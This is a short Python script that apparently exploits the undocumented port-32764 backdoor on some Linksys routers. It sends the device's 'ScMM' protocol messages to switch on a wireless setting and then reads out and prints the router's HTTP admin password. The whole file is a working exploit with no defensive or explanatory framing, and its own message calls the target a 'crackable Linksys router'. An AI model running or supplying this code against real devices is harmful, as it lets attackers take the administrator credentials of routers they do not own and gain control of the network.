import socket
import struct
import sys

#HOST = '192.168.1.1'
HOST = '192.168.33.1'
PORT = 32764

def send_message(s, message, payload=''):
    header = struct.pack('<III', 0x53634D4D, message, len(payload))
    s.send(header+payload)
    response = s.recv(0xC)
    if len(response) != 12:
        print("Device is not a crackable Linksys router.")
        print("Recieved invalid response: %s" % response)
        raise sys.exit(1)
    sig, ret_val, ret_len = struct.unpack('<III', response)
    assert(sig == 0x53634D4D)
    if ret_val != 0:
        return ret_val, "ERROR"
    ret_str = ""
    while len(ret_str) < ret_len:
        ret_str += s.recv(ret_len-len(ret_str))
    return ret_val, ret_str

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
send_message(s, 3, "wlan_mgr_enable=1")
print send_message(s, 2, "http_password")
